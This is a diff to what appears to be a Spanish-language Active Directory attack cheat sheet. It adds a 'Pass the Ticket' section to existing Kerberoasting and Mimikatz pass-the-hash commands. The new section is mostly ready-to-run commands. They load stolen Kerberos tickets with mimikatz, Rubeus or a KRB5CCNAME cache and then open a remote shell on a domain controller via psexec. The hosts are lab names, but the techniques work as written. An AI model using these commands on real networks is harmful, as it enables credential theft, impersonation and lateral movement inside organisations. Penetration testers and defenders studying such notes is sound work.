@@ -242,3 +242,18 @@ Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASC
 `Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.htb /ntlm:NTLMhash /run:powershell.exe"' ` # Usamos mimikatz en la maquina victima, este ataque tambien se puede efectuar con usuarios del ordenador, no solo del dominio.
 
 
+## PASS THE TICKET 
+
+*Este tipo de ataque es similar a Pass the Key, pero en lugar de usar hashes para solicitar un ticket, el ticket en sí es robado y utilizado para autenticarse como propietario*
+
+`export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
+python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass` # Linux
+
+``
+#Load the ticket in memory using mimikatz or Rubeus
+mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
+.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi
+klist #List tickets in cache to cehck that mimikatz has loaded the ticket
+.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
+``
+
